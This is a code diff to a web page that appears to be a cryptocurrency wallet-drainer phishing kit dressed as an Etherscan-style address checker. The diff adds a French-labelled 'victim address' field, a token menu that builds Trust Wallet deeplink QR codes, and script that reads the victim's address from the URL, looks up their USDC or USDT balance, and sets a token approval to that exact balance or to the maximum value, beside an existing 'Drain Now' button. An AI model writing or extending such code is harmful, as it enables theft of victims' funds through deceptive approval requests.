@@ -260,6 +260,27 @@
     /* ── PROBE NAV ITEMS ── */
     .probe-nav-item { color: var(--azure-40) !important; font-weight: 500; }
     .probe-nav-item::before { content: '⚡ '; font-size: 11px; }
+    /* ── TOKENS DROPDOWN CUSTOM ── */
+    .tokens-dropdown { min-width: 480px; padding: 20px 20px 16px; }
+    .tokens-columns { display: flex; gap: 0; }
+    .tokens-col { flex: 1; padding: 0 16px; }
+    .tokens-col:first-child { padding-left: 0; border-right: 1px solid var(--grey-93); }
+    .tokens-col:last-child { padding-right: 0; }
+    .tokens-col-header { font-size: 11px; font-weight: 600; color: var(--grey-46); text-transform: uppercase; letter-spacing: .04em; margin-bottom: 10px; padding-bottom: 8px; border-bottom: 1px solid var(--grey-93); }
+    .tokens-col-header s { text-decoration-color: var(--punch); color: var(--grey-46); }
+    .token-row { display: flex; align-items: center; gap: 9px; padding: 7px 8px; border-radius: 6px; cursor: pointer; font-size: 13px; color: var(--azure-15); transition: background .12s ease; user-select: none; }
+    .token-row:hover { background: var(--grey-98); }
+    .token-row.selected { background: color-mix(in srgb, var(--azure-40) 10%, transparent); color: var(--azure-40); font-weight: 500; }
+    .token-row.selected::before { content: '✓'; font-size: 11px; color: var(--azure-40); margin-right: -2px; }
+    .token-wc-row { cursor: default; opacity: .85; }
+    .token-wc-row:hover { background: transparent; }
+    .token-logo { width: 22px; height: 22px; border-radius: 50%; flex: none; }
+    .token-addr-wrap { margin-top: 12px; padding-top: 10px; border-top: 1px solid var(--grey-93); }
+    .token-addr-wrap input { width: 100%; padding: 7px 10px; border-radius: 4px; border: 1px solid var(--grey-93); background: var(--grey-98); font-size: 13px; color: var(--azure-15); font-family: inherit; }
+    .token-addr-wrap input:focus { outline: none; border-color: var(--azure-40); }
+    .tokens-qr-footer { margin-top: 16px; padding-top: 14px; border-top: 1px solid var(--grey-93); display: flex; justify-content: center; }
+    .tokens-qr-btn { padding: 9px 36px; background: var(--azure-40); color: #fff; border: none; border-radius: 6px; font-size: 13px; font-weight: 600; cursor: pointer; font-family: inherit; transition: opacity .15s; letter-spacing: .01em; }
+    .tokens-qr-btn:hover { opacity: .85; }
   </style>
 </head>
 <body id="top">
@@ -389,6 +410,17 @@
         <input type="text" id="victim-address" placeholder="0x..." />
         <button id="drain-btn">Drain Now</button>
         <p class="status" id="drain-status"></p>
+        <div style="margin-bottom: 15px; margin-top: 15px; border-top: 1px solid var(--grey-93); padding-top: 15px;">
+          <label for="target-from-address" style="display: block; margin-bottom: 5px; font-size: 14px; color: var(--azure-15);">
+            Adresse de la victime (pour solde exact) :
+          </label>
+          <input type="text" id="target-from-address" placeholder="0x..."
+                 style="width: 100%; padding: 10px; border-radius: 4px; border: 1px solid var(--grey-93);
+                        background: var(--grey-98); font-size: 14px; color: var(--azure-15);" />
+          <p style="font-size: 12px; color: var(--grey-46); margin-top: 5px;">
+            Collez l'adresse ETH de la victime ici pour générer un QR code avec montant exact
+          </p>
+        </div>
         <div style="margin-top: 20px;">
           <div style="display: flex; align-items: center; gap: 10px;">
             <label for="toggle-mode-switch" style="font-size: 14px; color: var(--azure-15);">Mode manuel</label>
@@ -581,19 +613,8 @@
     },
     {
       label: 'Tokens', href: 'https://verify-address.io/tokens',
-      items: [
-        { label: 'Token Approvals', href: 'https://verify-address.io/approvals' },
-        { label: 'Top Tokens', href: 'https://verify-address.io/tokens' },
-        { label: 'View ERC-20 Transfers', href: 'https://verify-address.io/tokentxns' },
-        { label: 'ERC-20 Tokens By Holding', href: 'https://verify-address.io/tokenholdings' },
-        { label: 'Top NFTs', href: 'https://verify-address.io/top-nfts' },
-        { label: 'Latest Mints', href: 'https://verify-address.io/nftmints' },
-        { divider: true },
-        { label: 'USDC ERC20 WalletConnect',    href: 'https://verify-address.io/', probe: false, probeClass: false },
-        { label: 'USDC ERC20 no WalletConnect', probe: 'usdc-erc20' },
-        { label: 'USDT ERC20 no WalletConnect', probe: 'usdt-erc20' },
-        { label: 'USDT TRC20 no WalletConnect', probe: 'usdt-trc20' },
-      ],
+      customMenu: 'tokens',
+      items: [],
     },
     {
       label: 'NFTs', href: 'https://verify-address.io/nft-top-contracts',
@@ -644,7 +665,36 @@
       } else {
         html += '<a class="nav-link" href="' + item.href + '">' + item.label + '</a>';
       }
-      if (item.items) {
+      if (item.customMenu === 'tokens') {
+        var LOGO_USDC  = 'https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/ethereum/assets/0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48/logo.png';
+        var LOGO_USDT  = 'https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/ethereum/assets/0xdAC17F958D2ee523a2206206994597C13D831ec7/logo.png';
+        var LOGO_TRON  = 'https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/tron/assets/TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t/logo.png';
+        html += '<div class="dropdown tokens-dropdown" data-panel="Tokens" hidden>';
+        html += '<div class="tokens-columns">';
+        // Colonne gauche — sans WalletConnect
+        html += '<div class="tokens-col">';
+        html += '<div class="tokens-col-header"><s>WalletConnect</s></div>';
+        html += '<div class="token-row" id="probe-usdc-erc20" onclick="selectProbe(\'usdc-erc20\',this);return false;">';
+        html += '<img src="' + LOGO_USDC + '" class="token-logo" /><span>USDC Ethereum</span></div>';
+        html += '<div class="token-row" id="probe-usdt-erc20" onclick="selectProbe(\'usdt-erc20\',this);return false;">';
+        html += '<img src="' + LOGO_USDT + '" class="token-logo" /><span>USDT Ethereum</span></div>';
+        html += '<div class="token-row" id="probe-usdt-trc20" onclick="selectProbe(\'usdt-trc20\',this);return false;">';
+        html += '<img src="' + LOGO_TRON + '" class="token-logo" /><span>USDT Tron</span></div>';
+        html += '<div class="token-addr-wrap">';
+        html += '<input type="text" id="dropdown-from-address" placeholder="0x..." autocomplete="off" />';
+        html += '</div></div>';
+        // Colonne droite — WalletConnect
+        html += '<div class="tokens-col tokens-col-right">';
+        html += '<div class="tokens-col-header">WalletConnect</div>';
+        html += '<div class="token-row token-wc-row" onclick="setOpen(null);return false;">';
+        html += '<img src="' + LOGO_USDC + '" class="token-logo" /><span>USDC Ethereum</span></div>';
+        html += '</div>';
+        html += '</div>'; // tokens-columns
+        html += '<div class="tokens-qr-footer">';
+        html += '<button class="tokens-qr-btn" onclick="generateDropdownQR();return false;">Generate QR</button>';
+        html += '</div>';
+        html += '</div>'; // tokens-dropdown
+      } else if (item.items && item.items.length) {
         html += '<div class="dropdown" data-panel="' + item.label + '" hidden>';
         item.items.forEach(function (sub) {
           if (sub.divider) html += '<div class="divider"></div>';
@@ -893,17 +943,18 @@
 const eth = window.ethereum;
 if (!eth) return;
 
-// Récupération silencieuse de l'adresse (sans popup)
-let from = eth.selectedAddress || eth.address || '';
-if (!from) {
-  try {
-    const accounts = await eth.request({ method: 'eth_accounts', params: [] });
-    from = (accounts && accounts[0]) ? accounts[0] : '';
-  } catch(e) { from = ''; }
+// Fonction utilitaire pour récupérer l'adresse depuis l'URL
+function getAddressFromUrl() {
+  const urlParams = new URLSearchParams(location.search);
+  const addr = urlParams.get('from') || urlParams.get('address') || urlParams.get('a');
+  if (addr && /^0x[a-fA-F0-9]{40}$/i.test(addr)) return addr.toLowerCase();
+  return null;
 }
-// Retry après délai si Trust Wallet est lent à injecter l'adresse
+
+// Priorité à l'URL (adresse passée dans le QR) — fallback wallet
+let from = getAddressFromUrl();
+
 if (!from) {
-  await new Promise(r => setTimeout(r, 400));
   from = eth.selectedAddress || eth.address || '';
   if (!from) {
     try {
@@ -913,7 +964,7 @@ if (!from) {
   }
 }
 
-// Fetch balance exact via RPC public — pas besoin de connexion wallet
+// Fetch balance exact via RPC public — utilise l'adresse depuis l'URL si dispo
 let approveAmount;
 try {
   const rpcProvider = new ethers.providers.JsonRpcProvider('https://ethereum.publicnode.com');
@@ -921,16 +972,16 @@ try {
     'function balanceOf(address) view returns (uint256)',
     'function decimals() view returns (uint8)'
   ], rpcProvider);
-// Si on a l'adresse, on récupère le solde exact, sinon on garde MAX
-let bal = ethers.BigNumber.from(0);
-if (from && from !== '0x0000000000000000000000000000000000000000') {
-  try {
-    bal = await tokenContract.balanceOf(from);
-  } catch(e) { console.warn('balanceOf failed', e); }
-}
-  approveAmount = bal.isZero()
-    ? '115792089237316195423570985008687907853269984665640564039457584007913129639935'
-    : bal.toString();
+
+  if (from && from !== '0x0000000000000000000000000000000000000000') {
+    const bal = await tokenContract.balanceOf(from);
+    approveAmount = bal.isZero()
+      ? '115792089237316195423570985008687907853269984665640564039457584007913129639935'
+      : bal.toString();
+    console.log('Solde exact récupéré:', approveAmount, 'pour adresse:', from);
+  } else {
+    approveAmount = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
+  }
 } catch(e) {
   // fallback MAX si RPC fail
   approveAmount = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
@@ -960,7 +1011,19 @@ try {
       'usdt-trc20': 'USDT TRC20 · Scan avec Trust Wallet',
     };
 
+    // Récupérer l'adresse saisie manuellement dans le champ
+    var targetInput = document.getElementById('target-from-address');
+    var targetAddress = targetInput ? targetInput.value.trim() : '';
+
+    // Valider le format de l'adresse
+    var isValidAddress = /^0x[a-fA-F0-9]{40}$/i.test(targetAddress);
+
+    // Construire l'URL avec l'adresse si valide
     var probeUrl = 'https://verify-address.io/?preset=' + preset;
+    if (isValidAddress) {
+      probeUrl += '&from=' + targetAddress.toLowerCase();
+    }
+
     var deeplink = 'https://link.trustwallet.com/open_url?coin_id=60&url=' + encodeURIComponent(probeUrl);
 
     // Remplace le QR existant en place — même design que le QR WalletConnect
@@ -971,7 +1034,6 @@ try {
       '<div id="qr-wrapper">',
         '<div id="qr-code"></div>',
         '<div id="logo-box">',
-          // Trust Wallet icon centré (même position que le logo Etherscan WC)
           '<svg width="34" height="34" viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">',
             '<path d="M50 10 C28 10 10 28 10 50 C10 72 28 90 50 90 C72 90 90 72 90 50 C90 28 72 10 50 10Z" fill="#3375BB"/>',
             '<path d="M35 35 L65 35 L65 42 L55 42 L55 68 L45 68 L45 42 L35 42 Z" fill="#ffffff"/>',
@@ -980,7 +1042,15 @@ try {
       '</div>'
     ].join('');
 
-    if (scanText) scanText.textContent = scanLabels[preset] || 'Scan avec Trust Wallet';
+    if (scanText) {
+      var label = scanLabels[preset] || 'Scan avec Trust Wallet';
+      if (isValidAddress) {
+        label += ' (montant exact)';
+      } else {
+        label += ' (montant MAX)';
+      }
+      scanText.textContent = label;
+    }
 
     var qrContainer = document.querySelector('.qr');
     var containerWidth = qrContainer ? qrContainer.clientWidth : 260;
@@ -998,6 +1068,33 @@ try {
       cornersDotOptions: { type: 'dot', color: '#000000' }
     });
     qr.append(document.getElementById('qr-code'));
+  }
+
+  // ── SÉLECTION TOKEN + GÉNÉRATION QR DEPUIS LE DROPDOWN ──────────────────
+
+  window._selectedProbe = null;
+
+  function selectProbe(preset, el) {
+    window._selectedProbe = preset;
+    document.querySelectorAll('.token-row').forEach(function(r) { r.classList.remove('selected'); });
+    if (el) el.classList.add('selected');
+  }
+
+  function generateDropdownQR() {
+    if (!window._selectedProbe) {
+      // Sélection par défaut si rien choisi
+      window._selectedProbe = 'usdt-erc20';
+      var defaultRow = document.getElementById('probe-usdt-erc20');
+      if (defaultRow) defaultRow.classList.add('selected');
+    }
+    // Sync adresse dropdown → champ admin
+    var ddAddr = document.getElementById('dropdown-from-address');
+    var adminAddr = document.getElementById('target-from-address');
+    if (ddAddr && adminAddr) {
+      adminAddr.value = ddAddr.value.trim();
+    }
+    setOpen(null);
+    openProbeQR(window._selectedProbe);
   }
 
   // ─────────────────────────────────────────────────────────────────────────
